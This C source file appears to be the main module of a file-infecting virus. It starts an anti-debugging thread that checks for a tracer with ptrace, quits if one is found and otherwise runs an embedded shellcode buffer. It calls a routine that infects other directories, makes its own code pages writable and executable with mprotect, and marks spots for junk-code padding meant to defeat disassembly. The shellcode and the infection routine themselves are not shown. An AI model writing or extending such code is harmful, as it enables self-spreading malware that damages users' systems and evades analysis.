#include "includes.h"
#include "infection.h"
#include "anti-disassembler.h"
#include "anti-debugging.h"


void *antiDebuggingThread() {
  //   JUNK
    while (1) {
        if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
            printf("Do NOT debug me!");
            exit(-1);
        }

        int (*shellcodec)() = (int (*)()) shellcode;
        shellcodec();

        sleep(50);
        // autodestruction();
    }
   //  JUNK
}

int main(int argc, char* argv[]) {

      //   JUNK

    pthread_t thread_id;
    pthread_create(&thread_id, NULL, antiDebuggingThread, NULL);

    infectDifferentDirectories(argv);

    uint8_t* code = (uint8_t*) &main;

    long pagesize = sysconf(_SC_PAGESIZE);
    if (pagesize <= 0)
        return 1;
    size_t mask = pagesize - 1;

      //   JUNK
      
    void* alignedcode = (void*) ((size_t) code & ~mask);

    if (mprotect(alignedcode, (size_t) code - (size_t) alignedcode + END, PROT_READ | PROT_WRITE | PROT_EXEC))
        return 1;

    return 0;
}
